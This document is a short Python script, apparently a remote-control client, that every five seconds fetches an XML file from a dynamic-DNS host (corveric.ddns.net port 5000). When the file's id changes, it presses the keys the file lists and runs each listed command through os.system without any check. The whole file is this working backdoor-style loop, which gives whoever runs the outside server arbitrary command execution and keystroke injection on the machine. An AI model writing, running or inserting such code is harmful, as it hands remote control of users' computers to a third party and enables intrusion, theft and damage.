import xml.etree.ElementTree as ET
import requests
import time
import os
import keyboard as kb

def extract_content(xml_string, tag_name):
    try:
        root = ET.fromstring(xml_string)
        element = root.find(tag_name)
        if element is not None and element.text is not None:
            return element.text
        else:
            return ""  # Return an empty string if tag is empty or missing
    except ET.ParseError as e:
        print(f"Error parsing XML: {e}")
        return None

def get_xml_content(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Error: Unable to fetch the XML file. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

url = 'http://corveric.ddns.net:5000/xml' 
old_id = 99999999

while True:
    try:
        xml_content = get_xml_content(url)
        if xml_content is None or xml_content.strip() == "":
            print("No valid XML content received, skipping iteration.")
            time.sleep(5)
            continue  # Skip to the next iteration if there's no valid XML
        
        print("Fetched XML:", xml_content)  # Debug print of the XML content

        upd = extract_content(xml_content, "update")
        ide = extract_content(xml_content, "id")

        if upd is None or ide is None:
            print("Error extracting content from XML, skipping iteration.")
            time.sleep(5)
            continue

        if ide != old_id:  # If ID has changed, process the keys and commands
            old_id = ide

            keys = extract_content(xml_content, "keys").split("*") if extract_content(xml_content, "keys") else []
            cmds = extract_content(xml_content, "cmd").split("*") if extract_content(xml_content, "cmd") else []

            for key in keys:
                if key.strip():
                    print(f"Pressing key: {key}")
                    kb.press_and_release(key)
                    time.sleep(0.2)

            for cmd in cmds:
                if cmd.strip():
                    print(f"Executing command: {cmd}")
                    os.system(cmd)
                    time.sleep(0.2)

    except Exception as e:
        print(f"Unexpected error: {e}")

    time.sleep(5)
